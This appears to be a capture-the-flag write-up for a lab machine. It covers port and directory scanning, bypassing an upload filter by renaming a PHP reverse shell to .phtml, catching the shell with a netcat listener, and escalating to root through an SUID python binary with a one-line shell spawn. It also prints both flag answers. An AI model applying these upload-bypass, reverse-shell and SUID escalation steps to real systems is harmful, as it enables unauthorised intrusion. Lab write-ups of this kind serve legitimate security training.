## IP : 10.10.161.62
to check for open ports we use nmap
### Nmap Results ::
`**$ nmap -Pn 10.10.161.62**`

we see that port 80 and 22 are open so we first check port 80 

To check the directories present on the port 80 wee do directory busting using **feroxbuster** (alternative of this could be **gobuster**, but feroxbuster has additional recurrsive directory busting feature in it)
### Feroxbuster Results ::
`**$ feroxbuster -u http://10.10.161.62 -w /usr/share/wordlists/dirb/common.txt**`

There is panel directory in which we uploads any file on the website
we can check our uploaded file in uploads directory
So, we can upload a php reverse shell on the website using panel directory
.php extension ws giving error so saved the file as .phtml 
now that we have successfully uploaded our reverse shell lets set up a listerner using netcat
`**$ nc -lnvp 1234**`

we got the shell
checking the /home directory we get 2 users **test** and **rootme** nothing useful in there
so we use find command to search for the user.txt
`**$ find -name user.txt | grep user**`

reading the user.txt we get user flag
### Flag_1
`THM{y0u_g0t_a_sh3ll}`

now we know that root flag is /root directory but we can not read it so we hace escalte our privileges to read the flag

`**$ find / -perm -u=s -type f 2>/dev/null**`

to check the SUID binaries present 
![](https://i.imgur.com/5sHpCXQ.png)

we get /usr/bin/python binaries which can be exploited to escalte the privilege

`**$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'**`

now we have root privileges

reading the flag from /root/root.txt

`**# cat /root/root.txt**`
### Flag_2 
`THM{pr1v1l3g33sc4l4t10n}`
